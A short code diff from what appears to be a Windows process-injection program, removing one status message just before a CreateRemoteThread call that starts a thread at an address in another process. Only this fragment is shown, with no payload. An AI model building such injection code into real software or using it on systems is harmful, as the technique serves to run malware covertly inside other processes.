@@ -368,7 +368,6 @@ int wmain() {
 		printf("[!] FAILED \n");
 		return -1;
 	}
-	printf("[+] DONE \n");
 
 	hThread = CreateRemoteThread(hProcess, NULL, NULL, pAddress, NULL, NULL, NULL);
 	if (hThread == NULL)
